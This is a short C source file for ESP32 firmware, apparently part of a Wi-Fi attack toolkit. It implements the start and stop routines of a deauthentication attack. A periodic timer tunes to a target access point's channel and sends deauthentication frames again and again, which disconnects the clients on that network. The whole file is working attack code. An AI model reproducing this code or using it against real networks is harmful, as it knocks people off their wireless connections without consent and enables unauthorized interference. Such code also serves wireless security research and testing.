#include "attack_deauth.h"

static esp_timer_handle_t deauth_timer_handle;
//static bool deauth_state = 0;

static void timer_send_deauth_frame(void *arg) {
    send_deauth_frame((wifi_ap_record_t *) arg);
}

void deauth_attack_start(const wifi_ap_record_t * target, const unsigned int period_millisec) {
    ESP_ERROR_CHECK(wifi_set_channel(target->primary));
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) target
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_millisec * 1000));
    //deauth_state = 1;
}

void deauth_attack_stop(void) {
    //if (deauth_state) {
        ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
        esp_timer_delete(deauth_timer_handle);
        //deauth_state = 0;
    //}
}